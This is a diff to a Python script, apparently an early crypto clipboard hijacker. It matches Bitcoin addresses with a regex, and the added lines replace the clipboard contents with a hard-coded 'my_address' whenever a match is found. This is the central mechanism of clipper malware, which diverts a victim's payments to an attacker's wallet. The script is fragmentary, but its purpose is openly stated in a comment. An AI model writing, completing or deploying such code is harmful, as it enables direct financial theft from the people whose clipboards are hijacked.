@@ -3,21 +3,18 @@ import asyncio
 import re
 
 # For all possible BTC wallet configuration 
-BTC_ADDRESS_MATCH = '([13]{1}[a-km-zA-HJ-NP-Z1-9]{27,34}|bc1[a-z0-9]{39,59})' #'([13]|bc1)[A-HJ-NP-Za-km-z1-9]{27,34}'
-
-bitcoin_addresses = [
-    '1BvBMSEYstWetqTFn5Au4m4GFg7xJaNVN2', # True
-    '3J98t1WpEZ73CNmQviecrnyiWrnqRhWNLy', # True
-    'bc1qar1srrr0xfkvy5r643hydnw9re59gtzzwf5mdq' # False ('0' char) #'([13]|bc1)[A-HJ-NP-Za-km-z1-9]{27,34}' 1BvBMSEYstWetqTFn5Au4m4GFg7xJaNVN2 3J98t1WpEZ73CNmQviecrnyiWrnqRhWNLy
-    ]
-for addr in bitcoin_addresses:
-    print(re.match(BTC_ADDRESS_MATCH, addr))
+BTC_ADDRESS_MATCH = '([13]{1}[a-km-zA-HJ-NP-Z1-9]{27,34}|bc1[a-z0-9]{39,59})'
 
 # Matching and changing btc function.
 async def btc_address(value):
     
     text = re.match(BTC_ADDRESS_MATCH , value)
-    
+    if text != None:
+        my_address = '1BvBMSEYstWetqTFn5Au4m4GFg7xJaNVN2'
+        new_value = pyperclip.copy(my_address)
+        print (value)
+        print(new_value)
+
     print (text)
         
     #print(value)
